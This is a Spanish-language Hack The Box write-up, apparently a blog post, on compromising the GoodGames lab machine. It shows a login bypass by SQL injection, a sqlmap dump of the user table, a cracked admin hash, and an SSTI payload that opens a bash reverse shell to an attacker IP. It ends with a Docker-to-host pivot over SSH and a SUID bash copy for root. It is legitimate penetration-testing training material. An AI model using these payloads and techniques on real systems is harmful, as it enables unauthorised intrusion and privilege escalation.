---
tags:
  - eJPT
  - eWPT
Category: Hack The Box
title: Machine Goodgames
comments: "true"
image: /assets/img/machines/Goodgames/Goodgamesbanner.jpeg
---

## Introducción
En este writeup detallo el proceso completo para comprometer la máquina GoodGames de Hack The Box. Comencé con una enumeración de puertos que reveló un servidor web corriendo en el puerto 80, junto con una mención al host goodgames.htb. A partir de ahí, realicé pruebas de inyección SQL para obtener credenciales, lo que me permitió acceder a la plataforma web. Aproveché una vulnerabilidad SSTI para ejecutar una reverse shell y obtener acceso al entorno Docker de la máquina. Finalmente, tras explorar el contenedor, identifiqué un vector de escalación de privilegios que me permitió obtener acceso root en el host principal y capturar las flags de usuario y root.

## Skills
- SQLI
- Hash Cracking 
- Server Side Template Injection (SSTI)
- Docker pivoting

## Enumeración
Realizando un escaneo de puertos se detectó que el puerto 80 se encuentra abierto, corriendo un servidor Apache junto a una aplicación desarrollada en Python utilizando Werkzeug. Además, se observa una mención al host goodgames.htb.

```bash
	❯ nmap -sCV -p 80 10.10.11.130
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-20 17:56 -04
	Nmap scan report for 10.10.11.130
	Host is up (0.25s latency).
	
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.51
	|_http-title: GoodGames | Community and Store
	|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
	Service Info: Host: goodgames.htb
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
```

Para facilitar el acceso al dominio observado, se añadió una entrada en el archivo /etc/hosts que asocia la dirección IP 10.10.11.130 con el nombre de host goodgames.htb.
```bash
❯ echo "10.10.11.130 goodgames.htb" >> /etc/hosts
```

### Enumeración WEB
Utilizando WhatWeb sobre el dominio goodgames.htb, se identificó que el sitio web utiliza tecnologías como Bootstrap, jQuery y está desarrollado en Python con el framework Werkzeug versión 2.0.2. También se observó la presencia de un campo de contraseña, lo que indica la existencia de algún tipo de autenticación.
```bash
❯ whatweb goodgames.htb
http://goodgames.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

Al acceder al sitio http://goodgames.htb, se visualiza una página principal con un formulario de inicio de sesión. Esto sugiere la posibilidad de realizar pruebas de autenticación, por lo que se procede a interceptar el tráfico con BurpSuite para analizar el funcionamiento del formulario y evaluar posibles vulnerabilidades.

![1](/assets/img/machines/Goodgames/1.jpeg)

## SQLI
Utilizando Burp Suite, se interceptó la petición enviada al momento de intentar iniciar sesión. Se modificó el valor del parámetro email inyectando un payload SQL para probar una posible vulnerabilidad de tipo SQL Injection:

![2](/assets/img/machines/Goodgames/2.jpeg)

Al reenviar la petición con este payload, el sistema permitió el acceso, confirmando la existencia de una vulnerabilidad de autenticación basada en inyección SQL. Esto indica que el backend no está sanitizando adecuadamente las entradas del usuario.

![3](/assets/img/machines/Goodgames/3.jpeg)

Luego de acceder exitosamente al panel como administrador, al intentar acceder a la sección de configuración, la aplicación redirige automáticamente al subdominio internal-administration.goodgames.htb. 

![4](/assets/img/machines/Goodgames/4.jpeg)

Sin embargo, este no es accesible inicialmente, ya que no está registrado en el archivo /etc/hosts, por lo que es necesario agregarlo manualmente para poder resolverlo correctamente.
```bash
❯ echo "10.10.11.130 internal-administration.goodgames.htb" >> /etc/hosts
```

Una vez agregado el subdominio internal-administration.goodgames.htb al archivo /etc/hosts, se logra acceder al sitio, el cual presenta una nueva interfaz de inicio de sesión. Esta interfaz corresponde a la plantilla Flask Volt, lo que sugiere que la aplicación sigue construida sobre el framework Flask y podría reutilizar mecanismos de autenticación similares.
![5](/assets/img/machines/Goodgames/5.jpeg)

Utilizando la solicitud capturada con BurpSuite, se procedió a realizar un análisis de inyección SQL con la herramienta sqlmap, esto permitió acceder a la base de datos main y extraer el contenido de la tabla user, revelando credenciales de usuarios almacenadas en el sistema.
```bash
sqlmap -r goodgames.req -D main -T user --dump
```

## Hash Cracking
El volcado de la tabla user reveló, entre otros datos, el hash de la contraseña del usuario administrador, identificado como 2b22337f218b2d82dfc3b6f77e7cb8ec. Este hash será utilizado en los siguientes pasos para intentar obtener la contraseña en texto claro y avanzar en la escalada de privilegios.
![6](/assets/img/machines/Goodgames/6.jpeg)

Al pegar el hash obtenido en la plataforma CrackStation, se logró descifrar la contraseña en texto claro, la cual resultó ser superadministrator. Esto permitió acceder con privilegios elevados al sistema para continuar con la explotación.
![7](/assets/img/machines/Goodgames/7.jpeg)

tilizando las credenciales admin : superadministrator, se logró acceder exitosamente a la plataforma protegida por el login desarrollado con Flask Volt, correspondiente al subdominio internal-administration.goodgames.htb.
![8](/assets/img/machines/Goodgames/8.jpeg)

## SSTI
Al acceder a la sección de configuración del perfil del usuario administrador, se identificó un campo editable correspondiente al nombre de usuario. Se realizó una prueba inicial de Server-Side Template Injection (SSTI).

![9](/assets/img/machines/Goodgames/9.jpeg)

Tras guardar los cambios, se observó que el nombre fue renderizado como 49, lo que confirma que el motor de plantillas está evaluando dinámicamente expresiones, revelando así una vulnerabilidad SSTI.

![10](/assets/img/machines/Goodgames/10.jpeg)

Una vez confirmada la vulnerabilidad de SSTI, se intentó su explotación para obtener una reverse shell.
Se utilizó la siguiente carga útil para ejecutar comandos del sistema:
```bash
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"').read() }}
```

![11](/assets/img/machines/Goodgames/11.jpeg)

Antes de aplicar los cambios, dejé mi equipo en escucha con nc

![12](/assets/img/machines/Goodgames/12.jpeg)

## Docker pivoting
Luego de haber obtenido acceso a la máquina, navegué hasta la raíz del sistema revelando la presencia del archivo oculto .dockerenv, lo cual indica que la aplicación Flask se está ejecutando dentro de un contenedor Docker.

![13](/assets/img/machines/Goodgames/13.jpeg)

Luego de identificar el archivo .dockerenv, ejecute un ifconfig. Esto reveló que la IP de la máquina comprometida era 172.19.0.2, una dirección perteneciente a un rango típico de redes internas de Docker. Esta información confirma que efectivamente me encuentro dentro de un contenedor Docker.
![14](/assets/img/machines/Goodgames/14.jpeg)

### Captura flag User

![15](/assets/img/machines/Goodgames/15.jpeg)

Posteriormente, ejecuté un netstat. Dentro del listado, identifiqué una conexión con la IP 172.19.0.1, lo que indica la presencia del host Docker. Esta dirección puede ser útil para intentar pivotear desde el contenedor hacia el host.
![16](/assets/img/machines/Goodgames/16.jpeg)

Con la dirección IP 172.19.0.1 identificada, realicé un escaneo de puertos desde el contenedor utilizando bash con redirección TCP:

![17](/assets/img/machines/Goodgames/17.jpeg)

Este escaneo reveló que el puerto 22 (SSH) se encontraba abierto en el host, lo cual podría permitir una conexión directa si se consigue acceso con credenciales válidas o mediante otro vector de ataque.

Con el puerto SSH abierto, intenté acceder al host utilizando las credenciales augustus:superadministrator, las cuales obtuve en pasos anteriores. La autenticación fue exitosa y obtuve acceso directo al sistema anfitrión.
![18](/assets/img/machines/Goodgames/18.jpeg)

Después de acceder como el usuario augustus vía SSH, preparé un método para escalar privilegios copiando el binario /bin/bash al directorio personal y luego, desde el contenedor, ajusté su propietario y permisos para activar el bit SUID. Esto permite ejecutar ese bash copiado con privilegios de root, facilitando el acceso completo al sistema.

```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/home/augustus# ls
bash  user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
root@3a453ab39d3d:/home/augustus# ls -l bash
-rwsrwxrwx 1 root root 1234376 Jul 21 00:58 bash
root@3a453ab39d3d:/home/augustus# 
```

A continuación, usé la nueva shell con permisos elevados para conectarme por SSH al host 172.19.0.1. Al listar los archivos pude confirmar que el bash modificado mantiene el bit SUID activo, lo que permite ejecutar una shell con privilegios de root. Ejecutando esta shell con la opción -p pude verificar que mi usuario tenía privilegios efectivos de root.

```bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 21 01:59:21 2025 from 172.19.0.2
augustus@GoodGames:~$ ls
bash  user.txt
augustus@GoodGames:~$ ls -la bash
-rwsrwxrwx 1 root root 1234376 Jul 21 01:58 bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)
bash-5.1# 
```

### Captura flag root

![19](/assets/img/machines/Goodgames/19.jpeg)